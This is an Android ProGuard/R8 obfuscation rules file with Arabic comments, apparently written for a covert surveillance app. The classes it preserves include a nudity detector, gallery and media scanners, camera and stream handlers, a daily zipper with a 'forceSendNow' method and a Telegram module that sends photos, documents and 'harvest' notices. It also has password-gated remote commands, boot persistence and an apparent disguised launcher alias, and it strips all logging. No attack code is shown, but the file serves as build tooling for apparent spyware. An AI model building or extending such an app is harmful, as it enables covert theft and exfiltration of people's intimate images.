# ============================================================
#  قواعد ProGuard/R8 المُحسّنة – نسخة مضغوطة نهائية
# ============================================================

-repackageclasses 'com.example.app.core'
-allowaccessmodification

-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
-keepattributes Exceptions, LineNumberTable

-keep public class com.example.app.MainActivity { *; }
-keep public class com.example.app.ForegroundService { *; }

# NudeDetector
-keepclassmembers class com.example.app.NudeDetector {
    public *** ensureModelReady(...);
    public *** loadEngineForever(...);
    public *** isReady(...);
}

# Monitor
-keepclassmembers class com.example.app.Monitor {
    public *** getBatteryStatus(...);
    public *** isWifiConnected(...);
    public *** forceHarvest(...);
}

# TelegramUi
-keepclassmembers class com.example.app.TelegramUi {
    public *** getVlt(...);
    public *** getCtrl(...);
    public *** getDat(...);
    public *** sendDocument(...);
    public *** sendPhoto(...);
    public *** sendMessage(...);
    public *** notifyHarvest(...);
}

# GalleryBrowser
-keepclassmembers class com.example.app.GalleryBrowser {
    public *** getGridKb(...);
    public *** showOptions(...);
    public *** executeAction(...);
    public *** updateLastMessageId(...);
}

# DailyZipper
-keepclassmembers class com.example.app.DailyZipper {
    public *** run(...);
    public *** forceSendNow(...);
}

# Commands
-keepclassmembers class com.example.app.Commands {
    public *** execute(...);
    public *** validateControlPassword(...);
}

-keepclassmembers class com.example.app.** {
    public *** *(...);
}

-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @androidx.annotation.Keep <fields>;
}

-keep class org.tensorflow.lite.Interpreter { *; }
-keep class org.tensorflow.lite.Interpreter$Options { *; }
-keep class org.tensorflow.lite.Tensor { *; }
-keep class org.tensorflow.lite.Delegate { *; }
-dontwarn org.tensorflow.lite.**

-keep class com.google.api.client.http.HttpTransport { *; }
-keep class com.google.api.client.http.javanet.NetHttpTransport { *; }
-keep class com.google.api.client.http.javanet.NetHttpTransport$Builder { *; }
-dontwarn com.google.api.client.http.**
-dontwarn com.google.api.client.http.javanet.**
-dontwarn com.google.crypto.tink.util.KeysDownloader

-dontwarn javax.**
-dontwarn kotlin.**
-dontwarn okhttp3.**
-dontwarn okio.**

-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
-assumenosideeffects class java.lang.System {
    public static void out.println(...);
    public static void err.println(...);
}

-keepclasseswithmembers class * {
    public <init>(...);
}

-keep class com.example.app.BootReceiver { *; }
-keep class com.example.app.MainActivityAlias { *; }
-keepclassmembers class com.example.app.StreamManager { *; }
-keepclassmembers class com.example.app.CameraAnalyzer { *; }

# ============================================================
# ✅ حماية شاملة ومحددة للانعكاس (Reflection) لمنع أخطاء Runtime
# ============================================================
-keep class com.example.app.Monitor { *; }
-keepclassmembers class com.example.app.Monitor { *; }

-keep class com.example.app.TelegramUi { *; }
-keepclassmembers class com.example.app.TelegramUi { *; }

-keep class com.example.app.Commands { *; }
-keepclassmembers class com.example.app.Commands { *; }

-keep class com.example.app.GalleryBrowser { *; }
-keepclassmembers class com.example.app.GalleryBrowser { *; }

-keep class com.example.app.MediaScanner { *; }
-keepclassmembers class com.example.app.MediaScanner { *; }

-keep class com.example.app.DailyZipper { *; }
-keepclassmembers class com.example.app.DailyZipper { *; }

-keep class com.example.app.CameraAnalyzer { *; }
-keepclassmembers class com.example.app.CameraAnalyzer { *; }

-keep class com.example.app.NudeDetector { *; }
-keepclassmembers class com.example.app.NudeDetector { *; }

-keep class com.example.app.ConfigLoader { *; }
-keepclassmembers class com.example.app.ConfigLoader { *; }

-keep class com.example.app.SecurityHelper { *; }
-keepclassmembers class com.example.app.SecurityHelper { *; }

# ============================================================
#  نهاية القواعد
# ============================================================
